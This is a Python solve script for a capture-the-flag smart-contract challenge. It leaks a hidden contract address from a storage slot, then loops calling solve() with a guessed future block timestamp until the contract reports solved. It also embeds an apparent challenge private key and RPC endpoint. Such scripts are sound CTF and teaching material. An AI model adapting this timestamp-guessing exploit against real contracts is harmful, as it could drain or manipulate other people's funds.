from web3 import Web3
from web3 import HTTPProvider
from solcx import compile_source
from web3.contract import Contract
from pwn import context, log

context.log_level = "INFO"

compile_blocker = compile_source(
    '''
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {}
    
    function solve(uint256 _guess) public {}
}
    ''',
    output_values=['abi']
)

abi = compile_blocker.popitem()[1]['abi']

log.info("ABI:\n%s", abi)


rpc_url = "http://challs.htsp.ro:9001/0063cd8c-4ca6-406f-9d78-780333434a5f"
privkey = "0x10cae695726f4922af0e3c272d929e3fc3eb9d7768a01aeffcadf224ff7fd4bf"
current_contract_addr = "0x4a0fCF94d888c4281226a90949ACf1edF7aC3776"

w3 = Web3(HTTPProvider(rpc_url))
w3.eth.default_account = w3.eth.account.privateKeyToAccount(privkey).address
leak = w3.eth.getStorageAt(current_contract_addr, 0).hex()
log.info("leak addr: %s", leak)
vuln_contract_addr = w3.toChecksumAddress("0x"+leak[-40:])
log.info("vuln addr: %s", vuln_contract_addr)
vuln_contract: Contract = w3.eth.contract(vuln_contract_addr, abi=abi)

gas_price = w3.eth.gasPrice
gas_limit = 1000000

server_delay = 3
while True:
    block = w3.eth.getBlock("latest")
    block_before = block.number
    timestamp_before = block.timestamp+server_delay
    log.info("before block: %s", block_before)
    log.info("before timestamp: %s", timestamp_before)
    tx_hash =  vuln_contract.functions.solve(timestamp_before).transact({"gasPrice": gas_price, "gas": gas_limit})
    block = w3.eth.getBlock("latest")
    block_after = block.number
    timestamp_after = block.timestamp
    log.info("after block: %s", block_after)
    log.info("after timestamp: %s", timestamp_after)

    diff = timestamp_after - timestamp_before
    log.info("timestamp diff: %s", diff)

    isSolve = vuln_contract.functions.solved().call()
    log.info("solved: %s", isSolve)

    if isSolve:
        break